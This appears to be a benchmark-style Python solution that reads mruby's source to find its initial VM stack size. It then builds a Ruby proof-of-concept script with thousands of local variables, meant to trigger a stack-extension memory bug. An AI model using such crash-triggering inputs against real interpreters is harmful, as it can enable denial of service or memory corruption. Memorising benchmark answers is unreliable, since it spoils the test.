import os
import re
import tarfile
from functools import lru_cache
from typing import Optional


RUBY_STACK_INIT_PATTERNS = (
    re.compile(r'^\s*#\s*define\s+MRB_STACK_INIT(?:_SIZE)?\s+\(?\s*(\d+)\s*\)?\s*$', re.MULTILINE),
    re.compile(r'^\s*#\s*define\s+MRB_STACK_INIT_(?:SIZE|STACK)\s+\(?\s*(\d+)\s*\)?\s*$', re.MULTILINE),
)


def _find_stack_init_in_text(text: str) -> Optional[int]:
    for rgx in RUBY_STACK_INIT_PATTERNS:
        m = rgx.search(text)
        if m:
            try:
                v = int(m.group(1))
                if 1 <= v <= 1_000_000:
                    return v
            except Exception:
                pass
    return None


def _guess_stack_init_from_tar(tar_path: str) -> Optional[int]:
    try:
        with tarfile.open(tar_path, "r:*") as tf:
            members = tf.getmembers()
            members.sort(key=lambda m: m.size)
            for m in members:
                if not m.isfile():
                    continue
                if m.size <= 0 or m.size > 250_000:
                    continue
                n = (m.name or "").lower()
                if not any(k in n for k in ("mruby.h", "state.h", "vm.h", "config.h", "mrbconf.h", "mrbconf", "compile.h")):
                    continue
                try:
                    f = tf.extractfile(m)
                    if not f:
                        continue
                    data = f.read()
                except Exception:
                    continue
                try:
                    txt = data.decode("utf-8", errors="ignore")
                except Exception:
                    txt = data.decode("latin-1", errors="ignore")
                v = _find_stack_init_in_text(txt)
                if v is not None:
                    return v
    except Exception:
        return None
    return None


def _guess_stack_init_from_dir(root: str) -> Optional[int]:
    candidates = []
    for dirpath, _, filenames in os.walk(root):
        for fn in filenames:
            lfn = fn.lower()
            if not any(k in lfn for k in ("mruby.h", "state.h", "vm.h", "config.h", "mrbconf.h", "compile.h")):
                continue
            p = os.path.join(dirpath, fn)
            try:
                st = os.stat(p)
            except Exception:
                continue
            if st.st_size <= 0 or st.st_size > 250_000:
                continue
            candidates.append((st.st_size, p))
    candidates.sort(key=lambda x: x[0])
    for _, p in candidates[:200]:
        try:
            with open(p, "rb") as f:
                data = f.read()
        except Exception:
            continue
        try:
            txt = data.decode("utf-8", errors="ignore")
        except Exception:
            txt = data.decode("latin-1", errors="ignore")
        v = _find_stack_init_in_text(txt)
        if v is not None:
            return v
    return None


@lru_cache(maxsize=None)
def _excel_base26(i: int) -> str:
    # 0 -> a, 25 -> z, 26 -> aa ...
    if i < 0:
        raise ValueError("i must be non-negative")
    s = []
    while True:
        s.append(chr(ord('a') + (i % 26)))
        i = i // 26 - 1
        if i < 0:
            break
    return ''.join(reversed(s))


def _generate_ruby_poc(nlocals: int, chunk: int = 200) -> bytes:
    if nlocals < 10:
        nlocals = 10
    if chunk < 1:
        chunk = 1

    names = ["_" + _excel_base26(i) for i in range(nlocals)]
    lines = []
    lines.append("def big(x)\n")
    for off in range(0, nlocals, chunk):
        part = names[off:off + chunk]
        lines.append(",".join(part) + "=x\n")
    lines.append("x\nend\n")
    lines.append("big(1)\n")
    return "".join(lines).encode("ascii", errors="ignore")


class Solution:
    def solve(self, src_path: str) -> bytes:
        stack_init = None
        if os.path.isdir(src_path):
            stack_init = _guess_stack_init_from_dir(src_path)
        else:
            stack_init = _guess_stack_init_from_tar(src_path)

        if stack_init is None:
            stack_init = 128

        # Ensure a meaningful extension beyond initial stack size
        nlocals = max(2000, stack_init * 2 + 500)

        # Keep per-line size reasonable
        chunk = 200
        if nlocals > 12000:
            chunk = 300
        if nlocals > 40000:
            chunk = 500

        return _generate_ruby_poc(nlocals=nlocals, chunk=chunk)